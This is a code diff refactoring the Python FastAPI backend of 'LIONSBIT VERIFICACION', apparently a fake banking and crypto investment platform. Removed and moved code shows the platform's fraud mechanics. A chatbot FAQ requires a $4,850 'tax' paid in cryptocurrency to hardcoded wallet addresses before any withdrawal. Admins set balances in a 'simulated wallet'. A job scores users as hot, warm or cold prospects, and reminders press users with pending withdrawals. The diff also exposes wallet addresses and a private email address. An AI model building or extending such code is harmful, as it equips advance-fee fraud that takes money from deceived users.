@@ -1,14 +1,10 @@
 from fastapi import FastAPI, APIRouter, HTTPException, Depends, status, UploadFile, File, Request
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
-from dotenv import load_dotenv
 from starlette.middleware.cors import CORSMiddleware
-from motor.motor_asyncio import AsyncIOMotorClient
+from typing import List, Optional
 import os
 import logging
 import asyncio
-from pathlib import Path
-from pydantic import BaseModel, Field, EmailStr
-from typing import List, Optional
 import uuid
 from datetime import datetime, timezone, timedelta
 import bcrypt
@@ -30,14 +26,14 @@ from apscheduler.triggers.interval import IntervalTrigger
 from bson import ObjectId
 import httpx
 
-# Import from refactored modules
 from config import (
     db, client, ROOT_DIR, RESEND_API_KEY, SENDER_EMAIL, ADMIN_EMAIL,
     JWT_SECRET, JWT_ALGORITHM, JWT_EXPIRATION_HOURS,
     EXCHANGE_RATES, DAILY_TRANSFER_LIMIT_EUR, UNVERIFIED_TRANSFER_LIMIT_EUR,
     TAX_AMOUNT, GOVERNMENT_TREASURY_ID, FRAUD_THRESHOLD_AMOUNT,
     FRAUD_THRESHOLD_COUNT, FRAUD_THRESHOLD_MINUTES,
-    ADMIN_ACCOUNTS, RESTRICTED_BANK_TRANSFER_EMAILS,
+    ADMIN_ACCOUNTS, RESTRICTED_BANK_TRANSFER_EMAILS, APP_BASE_URL,
+    CRYPTO_WALLETS, SUPPORT_EMAILS, CHATBOT_FAQ,
     MongoJSONEncoder, SafeJSONResponse, sanitize_mongo_doc, strip_id
 )
 from models import (
@@ -48,289 +44,26 @@ from models import (
     AdminAddBalance, CryptoPaymentSubmission, AdminCryptoPaymentAction,
     AdminManualTaxPayment, AdminUpdateWithdrawalStatus,
     SupportTicket, TicketReply, PasswordResetRequest, PasswordResetConfirm,
-    ChangePassword, PaymentIssueReport, BankTransferConfirm
+    ChangePassword, PaymentIssueReport, BankTransferConfirm,
+    InvestmentRequest, ActivityEvent, AdminWalletAssign, ChatMessage
 )
 from services.auth import (
     security, hash_password, verify_password, create_token,
     generate_transaction_reference, get_current_user, get_admin_user
 )
-from services.notifications import create_notification, notify_admins, create_admin_notification
+from services.notifications import create_notification, notify_admins
 from services.scoring import process_user_scoring, process_user_reminders
 
 # ==================== APP SETUP ====================
-# Refactored: config.py, models.py, services/auth.py, services/notifications.py, services/scoring.py
 resend.api_key = RESEND_API_KEY
 
-# Create the main app
 app = FastAPI(title="LIONSBIT VERIFICACION API", default_response_class=SafeJSONResponse)
-
-# Create a router with the /api prefix
 api_router = APIRouter(prefix="/api")
 
-# Security
-security = HTTPBearer()
-
-# Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ==================== MODELS ====================
-
-class UserCreate(BaseModel):
-    name: str = Field(..., min_length=2, max_length=100)
-    email: EmailStr
-    password: str = Field(..., min_length=6)
-
-class UserLogin(BaseModel):
-    email: EmailStr
-    password: str
-
-class UserResponse(BaseModel):
-    id: str
-    name: str
-    email: str
-    role: str
-    created_at: str
-    verification_status: Optional[str] = 'unverified'
-    account_status: Optional[str] = 'active'
-
-class AccountResponse(BaseModel):
-    id: str
-    user_id: str
-    account_type: str
-    balance_usd: float
-    balance_eur: float
-    created_at: str
-
-class BankingInfo(BaseModel):
-    account_holder: str
-    iban: Optional[str] = None
-    account_number: Optional[str] = None
-    swift_code: Optional[str] = None
-    routing_number: Optional[str] = None
-    bank_name: str
-    bank_country: str
-    bank_city: Optional[str] = None
-    account_type: Optional[str] = None
-
-class TransactionCreate(BaseModel):
-    account_id: str
-    transaction_type: str  # deposit, withdraw, transfer
-    amount: float = Field(..., gt=0)
-    currency: str = Field(default='USD')
-    description: Optional[str] = None
-    recipient_account_id: Optional[str] = None  # For transfers
-    banking_info: Optional[BankingInfo] = None  # For withdrawals
-
-class TransactionResponse(BaseModel):
-    id: str
-    account_id: str
-    user_id: str
-    transaction_type: str
-    amount: float
-    currency: str
-    status: str
-    description: Optional[str]
-    recipient_account_id: Optional[str]
-    created_at: str
-    tax_required: Optional[float] = None
-    tax_paid: Optional[float] = None
-    released_at: Optional[str] = None
-    transaction_reference: Optional[str] = None
-
-class PayTaxRequest(BaseModel):
-    amount: float = Field(..., gt=0)
-
-class AdminUpdateBalance(BaseModel):
-    account_id: str
-    balance_usd: float
-    balance_eur: float
-
-class AdminUpdateTransactionStatus(BaseModel):
-    transaction_id: str
-    status: str
-
-class AdminUpdateUserRole(BaseModel):
-    user_id: str
-    role: str
-
-class KYCSubmission(BaseModel):
-    document_type: str  # passport, id_card, driver_license
-    document_front: str  # base64 encoded - front of document
-    document_back: str   # base64 encoded - back of document
-    selfie_with_document: str  # base64 encoded - selfie holding document
-    digital_signature: str  # User's full name as digital signature
-    legal_consent: bool  # Must be True
-    # Investment history fields
-    investment_period: Optional[str] = None  # e.g., "2017-2023"
-    investment_details: Optional[str] = None  # Description of investments
-
-class AdminKYCAction(BaseModel):
-    user_id: str
-    action: str  # approve, reject, under_review
-    rejection_reason: Optional[str] = None
-
-class AdminSuspendUser(BaseModel):
-    user_id: str
-    action: str  # suspend, activate
-
-class AdminForceRelease(BaseModel):
-    transaction_id: str
-
-class AdminAddBalance(BaseModel):
-    user_id: str
-    amount: float = Field(..., gt=0)
-    currency: str = Field(default='USD')
-    description: Optional[str] = None
-
-class CryptoPaymentSubmission(BaseModel):
-    transaction_id: str
-    crypto_type: str  # BTC, ETH, USDT, LTC
-    network: Optional[str] = None  # BTC, ERC20, TRC20
-    txid: str = Field(..., min_length=10)
-    amount_sent: str
-    btc_address: Optional[str] = None  # User's BTC address
-    proof_image: Optional[str] = None  # base64 encoded image
-
-class AdminCryptoPaymentAction(BaseModel):
-    payment_id: str
-    action: str  # approve, reject
-    rejection_reason: Optional[str] = None
-
-class AdminManualTaxPayment(BaseModel):
-    transaction_id: str
-    amount: float = Field(..., gt=0)
-    payment_method: str = Field(default='crypto')  # crypto, wire_transfer, other
-    crypto_type: Optional[str] = None  # BTC, ETH, USDT
-    txid: Optional[str] = None  # Transaction ID for crypto payments
-    notes: Optional[str] = None
-
-class AdminUpdateWithdrawalStatus(BaseModel):
-    transaction_id: str
-    status: str  # pending, processing, transfer_in_progress, completed, rejected
-    rejection_reason: Optional[str] = None
-
-# ==================== NEW MODELS ====================
-
-class SupportTicket(BaseModel):
-    subject: str = Field(..., min_length=5, max_length=200)
-    message: str = Field(..., min_length=10)
-    category: str = Field(default='general')  # general, transfer, account, technical
-
-class TicketReply(BaseModel):
-    ticket_id: str
-    message: str = Field(..., min_length=1)
-
-class PasswordResetRequest(BaseModel):
-    email: EmailStr
-
-class PasswordResetConfirm(BaseModel):
-    token: str
-    new_password: str = Field(..., min_length=6)
-
-class ChangePassword(BaseModel):
-    current_password: str
-    new_password: str = Field(..., min_length=6)
-
-# Corporate Crypto Wallets (Fixed addresses for tax payments)
-CRYPTO_WALLETS = {
-    'BTC': {
-        'address': '1D8qYgB782ASjwDPwJAafuoTx2TFKFyM89',
-        'network': 'Bitcoin',
-        'name': 'Bitcoin',
-        'icon': 'bitcoin',
-    },
-    'BTC_LEGACY': {
-        'address': '1HXRaffo3SeLBjfD9Du12y8qE9Pod9m2uW',
-        'network': 'Bitcoin (Legacy)',
-        'name': 'Bitcoin (SafePal)',
-        'icon': 'bitcoin',
-    },
-    'ETH': {
-        'address': '0x3ab1d3202a3cd4541093601a16ae3770d33c9f28',
-        'network': 'Ethereum (ERC20)',
-        'name': 'Ethereum',
-        'icon': 'ethereum',
-    },
-    'BNB': {
-        'address': '0x3ab1d3202a3cd4541093601a16ae3770d33c9f28',
-        'network': 'BNB Smart Chain (BEP20)',
-        'name': 'BNB',
-        'icon': 'bnb',
-    },
-    'USDT': {
-        'address': 'TWsDmdfRX2aXmx8ndQy1ijwmDTXJs6NW6p',
-        'network': 'Tron (TRC20)',
-        'name': 'Tether USDT',
-        'icon': 'usdt',
-    },
-}
-
-SUPPORT_EMAILS = ['info@lionbit.es', 'info@paylionsbit.es']
-
-# ==================== HELPER FUNCTIONS ====================
-
-def hash_password(password: str) -> str:
-    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
-
-def verify_password(password: str, hashed: str) -> bool:
-    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))
-
-def create_token(user_id: str, email: str, role: str) -> str:
-    payload = {
-        'user_id': user_id,
-        'email': email,
-        'role': role,
-        'exp': datetime.now(timezone.utc) + timedelta(hours=JWT_EXPIRATION_HOURS)
-    }
-    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
-
-def generate_transaction_reference():
-    """Generate unique transaction reference: TRX-YYYY-XXXXXX"""
-    year = datetime.now(timezone.utc).year
-    unique_part = uuid.uuid4().hex[:6].upper()
-    return f"TRX-{year}-{unique_part}"
-
-async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
-    try:
-        payload = jwt.decode(credentials.credentials, JWT_SECRET, algorithms=[JWT_ALGORITHM])
-        user = await db.users.find_one({'id': payload['user_id']}, {'_id': 0})
-        if not user:
-            raise HTTPException(status_code=401, detail='User not found')
-        return user
-    except jwt.ExpiredSignatureError:
-        raise HTTPException(status_code=401, detail='Token expired')
-    except jwt.InvalidTokenError:
-        raise HTTPException(status_code=401, detail='Invalid token')
-
-async def get_admin_user(current_user: dict = Depends(get_current_user)):
-    if current_user.get('role') != 'admin':
-        raise HTTPException(status_code=403, detail='Admin access required')
-    return current_user
-
-async def create_notification(user_id: str, title: str, message: str):
-    """Create a notification for a user"""
-    notification = {
-        'id': str(uuid.uuid4()),
-        'user_id': user_id,
-        'title': title,
-        'message': message,
-        'read': False,
-        'created_at': datetime.now(timezone.utc).isoformat()
-    }
-    await db.notifications.insert_one(notification)
-    return notification
-
-async def notify_admins(title: str, message: str):
-    """Notify all admin users"""
-    admins = await db.users.find({'role': 'admin'}, {'_id': 0}).to_list(100)
-    for admin in admins:
-        await create_notification(admin['id'], title, message)
-
 # ==================== ADMIN NOTIFICATION SYSTEM ====================
-
-ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL', 'admi@paylionsbit.es')
-APP_BASE_URL = os.environ.get('APP_BASE_URL', 'https://compliance-dash-32.preview.emergentagent.com')
 
 async def create_admin_notification(
     notification_type: str,
@@ -1621,16 +1354,6 @@ async def create_ticket(ticket: SupportTicket, request: Request, current_user: d
     
     return {'message': 'Su solicitud ha sido enviada correctamente. Nuestro equipo de soporte se pondra en contacto con usted.', 'ticket_number': ticket_number, 'id': ticket_id}
 
-class PaymentIssueReport(BaseModel):
-    transaction_id: str
-    crypto_type: Optional[str] = None
-    network: Optional[str] = None
-    amount: Optional[str] = None
-    wallet_address: Optional[str] = None
-    tx_hash: Optional[str] = None
-    message: str
-    proof_image: Optional[str] = None
-
 @api_router.post("/support/payment-issue")
 async def report_payment_issue(report: PaymentIssueReport, current_user: dict = Depends(get_current_user)):
     """Report a payment issue - creates ticket with pre-filled data + marks transaction as under_review"""
@@ -2057,11 +1780,6 @@ async def get_account(account_id: str, current_user: dict = Depends(get_current_
 
 # ==================== INVESTMENT RESERVATION ====================
 
-class InvestmentRequest(BaseModel):
-    account_id: str
-    amount: float
-    currency: str = 'EUR'
-
 @api_router.post("/accounts/invest")
 async def reserve_investment(req: InvestmentRequest, current_user: dict = Depends(get_current_user)):
     """Reserve funds from checking to savings as 'investment reservation'"""
@@ -2392,11 +2110,6 @@ async def get_user_level(current_user: dict = Depends(get_current_user)):
     }
 
 # ==================== USER ACTIVITY TRACKING ====================
-
-class ActivityEvent(BaseModel):
-    event_type: str  # page_visit, button_click, session_active
-    page: Optional[str] = None
-    details: Optional[str] = None
 
 @api_router.post("/user/activity")
 async def track_activity(event: ActivityEvent, current_user: dict = Depends(get_current_user)):
@@ -5015,12 +4728,6 @@ async def get_binance_wallet(current_user: dict = Depends(get_current_user)):
         'updated_at': datetime.now(timezone.utc).isoformat(),
     }
 
-class AdminWalletAssign(BaseModel):
-    user_id: str
-    coin: str
-    available: float = Field(..., ge=0)
-    locked: float = Field(default=0, ge=0)
-
 @api_router.post("/admin/wallet/assign")
 async def admin_assign_wallet_asset(data: AdminWalletAssign, admin: dict = Depends(get_admin_user)):
     """Admin assigns/updates a crypto asset in a user's simulated wallet"""
@@ -5056,45 +4763,8 @@ async def admin_assign_wallet_asset(data: AdminWalletAssign, admin: dict = Depen
 
 # ==================== CHATBOT ROUTES ====================
 
-class ChatMessage(BaseModel):
-    message: str
-
-CHATBOT_FAQ = {
-    'retiro': {
-        'keywords': ['retiro', 'retirar', 'withdraw', 'sacar', 'dinero', 'fondos'],
-        'answer': 'Para solicitar un retiro: 1) Ve a la sección Withdraw en el menú lateral. 2) Selecciona la cuenta y el monto. 3) Se genera un impuesto obligatorio de $4,850 USD. 4) Paga el impuesto en criptomonedas (pagos parciales mínimo $200 USD). 5) El administrador revisará y aprobará tu retiro.'
-    },
-    'impuesto': {
-        'keywords': ['impuesto', 'tax', 'por qué pagar', 'pagar impuesto', '4850', '4,850'],
-        'answer': 'El impuesto de $4,850 USD es un requisito obligatorio de cumplimiento fiscal para procesar retiros. Debe ser pagado en criptomonedas. Puede realizar pagos parciales con un mínimo de $200 USD por pago.'
-    },
-    'tiempo': {
-        'keywords': ['cuánto tarda', 'tiempo', 'demora', 'cuanto tiempo', 'plazo', 'esperar'],
-        'answer': 'Tiempos de procesamiento: Pago de impuesto: 72 horas máximo. Revisión admin: 24-48 horas después del pago completo. Procesamiento: 1-3 días hábiles después de aprobación. Si no se completa el pago del impuesto en 72 horas, el retiro se rechaza automáticamente.'
-    },
-    'minimo': {
-        'keywords': ['mínimo', 'minimo', 'pago parcial', 'abono', 'parcial', '200'],
-        'answer': 'El pago mínimo por cada abono al impuesto es de $200 USD. Puede realizar múltiples pagos parciales hasta completar los $4,850 USD. Todos los pagos deben realizarse en criptomonedas.'
-    },
-    'verificacion': {
-        'keywords': ['verificar', 'verificación', 'kyc', 'identidad', 'documento', 'selfie'],
-        'answer': 'Para verificar su cuenta (KYC): 1) Vaya a Verification en el menú. 2) Suba la foto frontal del documento. 3) Suba la foto trasera. 4) Tome una selfie sosteniendo su documento. 5) Escriba su nombre legal como firma digital. 6) Acepte los términos y envíe. Revisión: 24-48 horas.'
-    },
-    'soporte': {
-        'keywords': ['soporte', 'ayuda', 'contactar', 'problema', 'ticket'],
-        'answer': 'Para contactar soporte: 1) Vaya a Support en el menú. 2) Cree un nuevo ticket. 3) Seleccione la categoría. Nuestro equipo responderá lo antes posible.'
-    }
-}
-
 
 # ─── Bank Transfer Payment Confirmation ───
-RESTRICTED_BANK_TRANSFER_EMAILS = ['marinini28@gmail.com']
-
-class BankTransferConfirm(BaseModel):
-    reference: str
-    comment: Optional[str] = None
-    proof_file: Optional[str] = None
-    proof_filename: Optional[str] = None
 
 @api_router.get("/payments/bank-transfer-access")
 async def check_bank_transfer_access(current_user: dict = Depends(get_current_user)):
@@ -5716,121 +5386,6 @@ async def ensure_admin_users():
             print(f"✅ Created admin: {admin_data['email']} (verified, active)")
 
 
-async def process_user_scoring():
-    """Calculate interest scoring for all users: hot/warm/cold"""
-    logging.info("Running user scoring job...")
-    try:
-        now = datetime.now(timezone.utc)
-        users = await db.users.find({'role': 'user'}, {'_id': 0, 'id': 1, 'email': 1, 'last_active': 1}).to_list(1000)
-        
-        for user in users:
-            user_id = user['id']
-            # Login count last 7 days
-            seven_days_ago = (now - timedelta(days=7)).isoformat()
-            login_count_7d = await db.login_history.count_documents({
-                'user_id': user_id,
-                'timestamp': {'$gte': seven_days_ago}
-            })
-            
-            # Check balance
-            account = await db.accounts.find_one({'user_id': user_id, 'account_type': 'checking'}, {'_id': 0})
-            balance = (account.get('balance_usd', 0) if account else 0) + (account.get('balance_eur', 0) if account else 0)
-            
-            # Days since last active
-            last_active = user.get('last_active')
-            if last_active:
-                try:
-                    la = datetime.fromisoformat(last_active.replace('Z', '+00:00')) if isinstance(last_active, str) else last_active
-                    days_inactive = (now - la).days
-                except Exception:
-                    days_inactive = 999
-            else:
-                days_inactive = 999
-            
-            # Pending withdrawal?
-            has_pending = await db.transactions.count_documents({
-                'user_id': user_id, 'transaction_type': 'withdraw',
-                'status': {'$in': ['pending', 'pending_tax', 'processing']}
-            })
-            
-            # Calculate score
-            if login_count_7d >= 3 and balance > 0:
-                score = 'hot'
-                score_label = 'Alto interes'
-            elif login_count_7d >= 1 or has_pending > 0:
-                score = 'warm'
-                score_label = 'Medio'
-            else:
-                score = 'cold'
-                score_label = 'Frio'
-            
-            await db.users.update_one(
-                {'id': user_id},
-                {'$set': {
-                    'interest_score': score,
-                    'interest_label': score_label,
-                    'score_data': {
-                        'logins_7d': login_count_7d,
-                        'balance': round(balance, 2),
-                        'days_inactive': days_inactive,
-                        'has_pending_withdrawal': has_pending > 0,
-                        'updated_at': now.isoformat()
-                    }
-                }}
-            )
-        
-        logging.info(f"User scoring completed for {len(users)} users")
-    except Exception as e:
-        logging.error(f"Error in user scoring: {e}")
-
-async def process_user_reminders():
-    """Send reminders to users every 12 hours if they have pending processes"""
-    logging.info("Running user reminder job (12h)...")
-    try:
-        now = datetime.now(timezone.utc)
-        
-        # Users with pending withdrawals that need tax payment
-        pending_tax = await db.transactions.find({
-            'transaction_type': 'withdraw',
-            'status': {'$in': ['pending_tax', 'pending']}
-        }, {'_id': 0, 'user_id': 1, 'amount': 1, 'currency': 1}).to_list(100)
-        
-        notified = set()
-        for tx in pending_tax:
-            uid = tx['user_id']
-            if uid in notified:
-                continue
-            notified.add(uid)
-            
-            await create_notification(uid, 'Proceso Pendiente',
-                f'Tienes un retiro de {tx["amount"]} {tx["currency"]} pendiente. Completa el proceso para continuar.')
-        
-        # Users with balance but no recent activity
-        users_with_balance = await db.accounts.find({
-            'account_type': 'checking',
-            '$or': [{'balance_usd': {'$gt': 0}}, {'balance_eur': {'$gt': 0}}]
-        }, {'_id': 0, 'user_id': 1, 'balance_usd': 1, 'balance_eur': 1}).to_list(100)
-        
-        for acc in users_with_balance:
-            uid = acc['user_id']
-            if uid in notified:
-                continue
-            
-            user = await db.users.find_one({'id': uid}, {'_id': 0, 'last_active': 1})
-            if user and user.get('last_active'):
-                try:
-                    la = datetime.fromisoformat(user['last_active'].replace('Z', '+00:00')) if isinstance(user['last_active'], str) else user['last_active']
-                    if (now - la).total_seconds() > 43200:  # >12h inactive
-                        total = acc.get('balance_usd', 0) + acc.get('balance_eur', 0)
-                        await create_notification(uid, 'Saldo Disponible',
-                            f'Tienes saldo disponible (${total:.2f}). Inicia sesion para gestionar tus fondos.')
-                        notified.add(uid)
-                except Exception:
-                    pass
-        
-        logging.info(f"Reminders sent to {len(notified)} users")
-    except Exception as e:
-        logging.error(f"Error in user reminders: {e}")
 
 
 @app.on_event("shutdown")
